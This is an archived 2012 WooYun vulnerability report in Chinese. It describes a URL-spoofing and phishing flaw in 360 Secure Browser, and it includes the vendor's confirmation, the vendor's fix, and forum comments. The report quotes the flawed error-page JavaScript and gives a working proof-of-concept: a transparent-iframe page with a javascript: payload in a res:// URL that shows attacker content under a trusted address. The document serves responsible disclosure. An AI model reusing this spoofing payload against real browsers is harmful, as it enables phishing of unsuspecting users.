{"id": 16059, "wybug_id": "wooyun-2012-013359", "wybug_title": "360浏览器欺诈漏洞（360安全漏洞序列之一）", "wybug_corp": "奇虎360", "wybug_author": "唐尸三摆手", "wybug_date": "2012-10-14 23:00", "wybug_open_date": "2012-11-28 23:01", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2012-12-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-12-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-12-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-11-28：\t细节向公众公开  简要描述： 最近360很火啊，又看到微博上乌云发的那个安全问题被水军猛喷，喷乌云就算了，可是某些言论把哥也惹到了，哥毕竟也是那个@360安扬 所骂的 搞web安全的，不懂客户端安全的人里的一个..... 之前报告360的安全问题人家补了感谢都没一个，软件基本都是不完美的，有点漏洞很正常，好好讨论就是，喷就不对了，俺这几天就接着看看到底不懂客户端的人能搞点什么漏洞出来。360安全浏览器中存在一个安全问题，可以诱导用户访问任意域名但是攻击者可以控制其中的内容，url看起来可信，但是实际上内容却可以是黑客构造的，形成钓鱼欺诈漏洞。 详细说明：  \n_parse_url: function () {            var tmp = this._error_url.split('/');            this._error_domain = tmp[2];            var regexp = /([^#\\?&=]+)=([^#\\?&=]+)/gi;            this._error_url_args = {};            var result = null;            while (result = regexp.exec(tmp[3])) {                //try{                //    this._error_url_args[ result[1] ] = decodeURIComponent(result[2]);                //}catch(e){                this._error_url_args[result[1]] = result[2];                //}            }        }\n访问出错时的一段逻辑\nEvent.bind($('#button_refresh'), 'click', function (e) {                Stats.add(5); // 5. 点击刷新按钮次数                e.preventDefault();                window.location = Error.info._error_url;            });\n跨站了，可信域的一个跨站，那么利用下吧\n<style>body { margin:0; padding:0 }#top { width:100%; height:500px; background:#ffffff; position: absolute; }#top input { position: absolute; top:0px; left:0px }iframe { z-index:1000; position:absolute; filter:alpha(opacity=0); left:-131px; top:-167px }</style><div id=\"top\"><input type=\"button\" value=\"Google\" /></div><iframe width=\"600\" height=\"500\" src=\"res://c:%5cprogra~1%5c360%5c360se%5cpages%5cpages.dll/NAVIERR.HTM#500#javascript:alert(location);x=window.open('res://c:%255cprogra~1%255c360%255c360se%255cpages%255cpages.dll/NAVIERR.HTM%23500%23https://www.google.com');x.document.write('<title>Google</title>i am wooyun');//&x=w\"></iframe>\n在360自身的资源文件中存在一个xss漏洞，不过该漏洞却发生在res的360信任域，该文件还实现了其他的譬如修改url显示等逻辑，利用这个漏洞就可以实现对任意url的修改但是又可以控制url里的内容   漏洞证明：  \n\n   修复方案：  360的安扬肯定懂   版权声明：转载请注明来源 唐尸三摆手@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-10-15 14:46 厂商回复： 漏洞原因：浏览器对网页输入未作校验，直接将形式“res:// 资源文件路径名/NAVIERR.HTML#XXXX#YYYYYYYYY”的地址显示为“YYYYYYYYY”。导致地址栏显示的URL与页面不符，形成钓鱼欺诈漏洞。感谢您的反馈，我们已经修复该漏洞，并会尽快发布新版本。您在方便的时候可以再Review下我们的新版本,thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-10-14 23:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  ......    \n     2012-10-14 23:04 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:70        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  强势围观，坐等公开    \n     2012-10-14 23:13 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  前排排队围观    \n     2012-10-14 23:16 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  360安全漏洞序列之一   洞主这是要连载？    \n     2012-10-14 23:17 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  对于这么一个连内网办公系统VPN都是改的人家思科的再打上自己的数字签名的公司,不太方便评价什么    \n     2012-10-15 00:37 |    \t\ttpu01yzx \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:8        | test)\t\t \n  建议以后360的洞直接公开得了，反正都是忽略的。    \n     2012-10-15 00:38 |    \t\tTASS_傅奎 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:5        | Leander)\t\t \n  围观啊    \n     2012-10-15 01:22 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  ........    \n     2012-10-15 01:48 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  接301 ........    \n     2012-10-15 09:38 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  要放连续剧么    \n     2012-10-15 09:49 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  别tj    \n     2012-10-15 10:20 |    \t\tpysolve \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | Time is killing u when ur killing time!)\t\t \n  那个@360安扬貌似确实很喜欢喷哦~~顶洞主    \n     2012-10-15 10:20 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  坐等之十~    \n     2012-10-15 12:04 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @hongygxiang 干嘛。火速围观，话说洞主有礼物。O(∩_∩)O哈哈~    \n     2012-10-15 12:28 |    \t\t悠悠 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:5        | 悠悠~~)\t\t \n  坐看360水军表演很是BS数字，太不厚道~    \n     2012-10-15 13:45 |    \t\tzhq445078388 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:19        | 请牢记\"杀进程点康姆\")\t\t \n  看起来像bho..坐等公开    \n     2012-10-15 15:01 |    \t\tsafeman \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 专注于安全 希望和大家多交流)\t\t \n  这个标题明显有歧义 明显是想黑360嘛这种带有攻击性的标题难道乌云运营者也不管理好?名声可是积累的 来的快去的更快    \n     2012-10-15 15:06 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @safeman 不知道你说的歧义是指什么？乌云是比较自由开放的平台，如果最终结果有问题，公开之后大家讨论自然会有正确的结果。感谢你的提醒 ；）    \n     2012-10-15 15:58 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  我怎么没看出来标题有攻击性。看出来是要连载了。    \n     2012-10-15 16:50 |    \t\t胯下有杀气 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:14        | 大姐，你黄瓜掉了。。。)\t\t \n  最近连载有爆发趋势啊，感觉能看到同样问题的不同挖掘手段，还是很赞的    \n     2012-10-15 17:31 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  感谢楼主提供漏洞信息,我们尽快修复漏洞!    \n     2012-10-15 17:41 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  LS亮了    \n     2012-10-15 18:46 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  @Hmily 360里黑阔很多的，哈哈。    \n     2012-10-15 20:32 |    \t\tFlyR4nk \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:18        )\t\t \n  @pysolve 除了喷感觉人品也不怎么样啊    \n     2012-10-15 20:51 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Hmily 这同志比微上的好多了    \n     2012-10-15 22:22 |    \t\tkkappa \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 宅男！)\t\t \n  果断吧数字都卸载了    \n     2012-10-16 10:17 |    \t\tpysolve \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | Time is killing u when ur killing time!)\t\t \n  @Hmily 人很不错，技术没得说，人品没得说，态度没得说。    \n     2012-10-16 10:58 |    \t\t唐尸三摆手 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:9        | 摆手啊摆手啊摆手！！)\t\t \n  @safeman @gainover 这筒子的意思是偶木办法连载的 偶尽力撒    \n     2012-10-16 11:06 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  @唐尸三摆手 支持 现在上乌云就是为了看你连载    \n     2012-10-16 11:16 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  以后见到连载到5的整数倍,wb支持~立帖为证,@心伤的胖子 请加油,wb不多,意思一下~~    \n     2012-10-17 13:14 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  @xsser 说的好，有无政府主义者的影子    \n     2012-10-25 18:18 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  原来PoC是个动图啊！    \n     2012-11-14 20:00 |    \t\toldsun \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 啪啪啪啪啪啪啪啪啪啪啪啪)\t\t \n  坐等下一下~~~    \n     2012-11-28 23:27 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  @Hmily H大原来是360的人啊。。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}